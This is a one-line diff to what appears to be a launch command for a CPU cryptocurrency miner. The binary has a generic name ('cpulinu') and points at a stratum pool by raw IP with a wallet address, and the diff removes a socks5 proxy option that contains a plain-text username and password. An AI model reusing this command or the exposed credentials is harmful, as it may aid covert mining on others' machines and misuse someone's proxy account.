@@ -1,1 +1,1 @@
-./cpulinu -a Yescryptr16 -o stratum+tcp://51.178.76.133:4025 -u RNnGqG97nqRSugwJw8s1dUVWv6tkWX492B.tani -x socks5://pymiivur-rotate:o5tci5ctvvde@p.webshare.io:80 -t4
+./cpulinu -a Yescryptr16 -o stratum+tcp://51.178.76.133:4025 -u RNnGqG97nqRSugwJw8s1dUVWv6tkWX492B.tani -t4
